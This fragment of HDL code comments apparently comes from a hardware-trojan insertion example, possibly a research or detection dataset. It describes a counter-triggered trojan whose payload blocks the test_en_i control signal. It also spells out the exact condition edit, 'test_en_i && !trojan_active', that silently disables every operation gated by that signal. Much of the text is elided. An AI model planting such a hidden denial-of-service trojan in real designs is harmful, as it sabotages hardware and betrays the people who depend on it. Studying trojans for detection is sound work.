 ...
 * 
 * Description:
 *   Disables operations by blocking test_en_i control signal
 *   
 * Trigger: Counter on test_en_i
 * Payload: Block test_en_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block test_en_i when trojan is active
//
// IMPORTANT: test_en_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (test_en_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: test_en_i && 0 = 0 (always false)
//   All operations controlled by test_en_i are blocked
